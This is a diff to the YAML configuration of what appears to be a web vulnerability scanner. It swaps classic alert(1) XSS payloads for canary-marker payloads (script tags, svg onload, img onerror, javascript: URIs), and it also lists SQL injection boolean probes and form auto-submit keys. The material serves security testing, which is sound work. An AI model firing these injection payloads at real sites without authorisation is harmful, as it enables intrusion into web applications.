@@ -9,7 +9,7 @@ http:
     fuzz_get: false
     fuzz_post: false
     stored_xss: True
-    submit: False
+    submit: true
 
 concurrency:
   max_workers: 20
@@ -96,21 +96,15 @@ path_traversal:
 
 xss:
   dom_payloads:
-    - "<img src=x onerror=alert(1)>"
-    - "\"><img src=x onerror=alert(1)>"
-    - "'\"><img src=x onerror=alert(1)>"
-    - "<video src=x onerror=alert(1)>"
-    - "<audio src=x onerror=alert(1)>"
-    - "<details open ontoggle=alert(1)>"
-    - "\"><svg/onload=alert(1)>"
-    - "<svg/onload=alert(1)>"
-    - "</script><script>alert(1)</script>"
-    - "<iframe srcdoc='<script>alert(1)</script>'></iframe>"
-    - "<body onload=alert(1)>"
-    - "<img src=1 onerror=alert`1`>"
-    - "<img src=x onerror=confirm(1)>"
-    - "<marquee onstart=alert(1)>"
-    - "javascript:alert(1)"
+    - ";window.__XSS_CANARY__=\"{CANARY}\";document.body.insertAdjacentHTML('afterbegin','<x-canary data-t=\"{CANARY}\"></x-canary>');//"
+    - "javascript:window.__XSS_CANARY__=\"{CANARY}\";document.title=\"{CANARY}\""
+    - "\"><script>window.__XSS_CANARY__=\"{CANARY}\";</script>"
+    - "<svg onload=\"window.__XSS_CANARY__='{CANARY}'\"></svg>"
+    - "\"><img src=x onerror=\"window.__XSS_CANARY__='{CANARY}'\">"
+    - "';localStorage.setItem(\"x\",\"{CANARY}\")//"
+    - "\";sessionStorage.setItem(\"y\",\"{CANARY}\")//"
+    - "</script><script>window.__XSS_CANARY__=\"{CANARY}\"</script>"
+    - "{CANARY}"
   dom_delay_seconds: 0.25
   regex:
     script: "<script[^>]*>(?:(?!</script>).)*({token})(?:(?!</script>).)*</script>"
@@ -152,13 +146,6 @@ sqli:
   timing_confirm_probes: 2
   plain_preprobe_min_delta: 1
   confirm_min_size_delta: 30
-  auto_submit_keys:
-    - "submit"
-    - "btn"
-    - "button"
-    - "search"
-    - "btnsign"
-    - "btnclear"
   boolean_true:
     - "1=1"
     - "2>1"
@@ -210,6 +197,19 @@ paths:
     - "param"
     - "interesting"
     - "interesting 200"
+    - "interesting_200"
+  auto_submit_keys:
+    - "submit"
+    - "btn"
+    - "button"
+    - "search"
+    - "btnsign"
+    - "btnclear"
+    - "save"
+    - "ok"
+    - "login"
+    - "add"
+    - "update"
 
 auth:
   login_path: "/login"
